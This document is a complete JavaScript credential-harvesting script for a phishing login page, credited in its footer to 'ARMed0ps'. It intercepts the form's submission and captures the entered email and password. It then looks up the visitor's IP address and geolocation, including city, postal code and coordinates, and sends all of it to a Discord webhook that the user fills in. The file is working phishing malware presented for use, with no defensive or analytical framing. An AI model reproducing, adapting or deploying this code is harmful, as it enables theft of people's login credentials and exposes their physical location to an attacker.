document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault(); // stop actual form from submitting

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    sendIPnlogin(email, password); // call the IP + login sending function
});

const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = ''; //place discord webhook here
                    
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "1pl0gg3r", // optionally changeable
                            avatar_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D", // optionally changeable
                            content: `@everyone`,
                            embeds: [
                                {
                                    title: "📡 New Visitor Logged",
                                    color: 0x800080,
                                    fields: [
                                        {
                                            name: "📧 Credentials",
                                            value: `**Email:** ${email}\n**Password:** ${password}`,
                                            inline: false
                                        },
                                        {
                                            name: "🧠 IP Address",
                                            value: `${ipadd}`,
                                            inline: true
                                        },
                                        {
                                            name: "🌍 Location",
                                            value: `**Network:** ${geoData.network}\n**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}`,
                                            inline: true
                                        },
                                        {
                                            name: "📮 Postal & Coords",
                                            value: `**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`,
                                            inline: false
                                        },
                                        {
                                            name: "🗺️ Google Maps",
                                            value: `[📍 View Location](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`,
                                            inline: false
                                        },
                                        {
                                            name: "📘 Full IP Data",
                                            value: `[🌐 View Full JSON](https://ipapi.co/${ipadd}/json/)`,
                                            inline: false
                                        }
                                    ],
                                    thumbnail: {
                                        url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
                                    },
                                    footer: {
                                        text: "IP Logger v2 by ARMed0ps",
                                        icon_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
                                    },
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
